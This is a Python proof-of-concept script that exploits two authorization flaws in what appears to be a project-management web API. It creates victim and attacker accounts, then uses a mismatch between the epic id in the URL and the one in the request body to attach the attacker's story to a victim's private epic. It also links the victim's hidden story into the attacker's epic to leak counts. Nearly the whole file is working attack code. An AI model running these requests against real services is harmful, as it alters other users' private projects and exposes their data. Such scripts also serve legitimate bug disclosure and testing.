import sys
sys.path.insert(0, '/root/johto-task4/L2/scratch/proofs')
from lib import *

v = register(uniq("vic"))
a = register(uniq("att"))
pv = new_project(v)       # private, attacker is NOT a member
pa = new_project(a)
PV, PA = pv["id"], pa["id"]
ev = v.post("/epics", {"project": PV, "subject": "victim epic"}).json()
usv = v.post("/userstories", {"project": PV, "subject": "victim SECRET us"}).json()
usa = a.post("/userstories", {"project": PA, "subject": "attacker us"}).json()
print("PV", PV, "PA", PA, "ev(victim)", ev["id"], "usv(victim)", usv["id"], "usa(attacker)", usa["id"])

# Confirm attacker cannot even see victim epic/us normally
show("att GET victim epic (should 403/404)", a.get("/epics/%s" % ev["id"]))
show("att GET victim us  (should 403/404)", a.get("/userstories/%s" % usv["id"]))

print("\n### BUG A: permission checked against body 'epic' (attacker's), object saved into URL epic (victim's)")
r = a.post("/epics/%s/related_userstories" % ev["id"], {"epic": usa and PA and None or None, "user_story": usa["id"]})
# send body epic = attacker's project epic id to pass the permission check
ea = a.post("/epics", {"project": PA, "subject": "att epic"}).json()
show("att POST url=EV(victim) body epic=EA(att) us=usa",
     a.post("/epics/%s/related_userstories" % ev["id"], {"epic": ea["id"], "user_story": usa["id"]}))
show("victim lists own epic related (attacker's US now attached!)",
     v.get("/epics/%s/related_userstories" % ev["id"]))

print("\n### BUG B: attacker links a US they cannot see (victim's) into their own epic")
show("att POST url=EA(att) body epic=EA us=usv(victim)",
     a.post("/epics/%s/related_userstories" % ea["id"], {"epic": ea["id"], "user_story": usv["id"]}))
show("att epic counts leak", a.get("/epics/%s" % ea["id"]), keys=["user_stories_counts", "subject"])
